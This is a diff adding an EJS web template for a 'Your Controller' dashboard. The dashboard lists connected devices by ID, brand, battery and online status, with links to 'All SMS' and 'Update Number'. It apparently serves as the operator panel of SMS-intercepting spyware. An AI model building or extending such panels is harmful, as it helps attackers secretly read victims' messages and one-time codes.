@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Your Controller</title>
+  <link rel="stylesheet" href="/css/phon.css" />
+</head>
+<body>
+  <nav class="header-nav">
+    <div class="menu-icon">&#9776;</div>
+    <h1>Your Controller</h1>
+  </nav>
+
+  <div class="nav-links">
+    <a href="/api/admin/settings">Update Number</a>
+    <a href="/api/notification/sms">All SMS</a>
+    <a href="/api/auth/change-credentials">Password change</a>
+  </div>
+
+  <div class="dot">
+    <div class="container" id="deviceContainer">
+      <% 
+        // Sort by uniqueid (optional if you want a certain order)
+        const sortedUsers = users.sort((a, b) => {
+          // If your uniqueid is a string, you might parseInt or compare strings
+          return a.uniqueid.toString().localeCompare(b.uniqueid.toString());
+        });
+
+        sortedUsers.forEach((user, index) => { 
+          // Grab the name from the first entry in userEntries if it exists
+          const hasUserEntry = user.userEntries && user.userEntries.length > 0;
+          const userName = hasUserEntry ? user.userEntries[0].name : null;
+      %>
+        <div class="device-card" data-id="<%= user.uniqueid %>">
+          <div class="device-content">
+            <img src="/image/style.webp" alt="User Icon" />
+            <div class="device-details">
+              <!-- If userName exists, show it; otherwise, show the device brand -->
+              <h2>User <%= index + 1 %>: <%= userName ? userName : user.brand %></h2>
+              <p><strong>User Id :</strong> <%= user.uniqueid %></p>
+              <p><strong>Battery :</strong> <%= user.batteryLevel %></p>
+            </div>
+          </div>
+          <div class="device-status <%= user.connectivity === 'Online' ? 'status-online' : 'status-offline' %>">
+            Status - <%= user.connectivity === 'Online' ? 'Online User' : 'Offline User' %>
+          </div>
+        </div>
+      <% }); %>
+    </div>
+  </div>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script src="/js/script.js"></script>
+</body>
+</html>
